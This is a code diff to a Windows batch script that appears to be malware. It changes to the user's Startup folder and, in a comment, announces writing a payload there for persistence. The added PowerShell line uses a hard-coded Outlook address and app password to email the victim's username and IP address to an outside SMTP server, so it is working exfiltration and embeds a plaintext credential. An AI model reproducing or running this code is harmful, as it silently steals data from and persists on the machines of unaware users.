@@ -10,7 +10,7 @@ set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Pr
 cd %STARTUP%
 
 @REM Set up SMTP
-powershell -Command $email = "fyp22356827@outlook.com"; $appPassword = "qbpyymmalyudxsur"; $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet -ErrorAction SilentlyContinue).IPAddress | Out-String; $subject = "$env:UserName logs"; $smtp = New-Object System.Net.Mail.SmtpClient("smtp.office365.com", "587"); $smtp.EnableSSL = $true; $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $appPassword); $smtp.Send($email, $email, $subject, $ip);
+powershell -NoProfile -Command "& { $email='fyp22356827@outlook.com'; $appPassword='qbpyymmalyudxsur'; $ip=(Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet -ErrorAction SilentlyContinue).IPAddress -join ', '; $subject=\"$env:UserName logs\"; $smtp=New-Object System.Net.Mail.SmtpClient('smtp.office365.com',587); $smtp.EnableSsl=$true; $smtp.Credentials=New-Object System.Net.NetworkCredential($email,$appPassword); $smtp.Send($email,$email,$subject,$ip) }"
 
 
 @REM writeS payload to startup
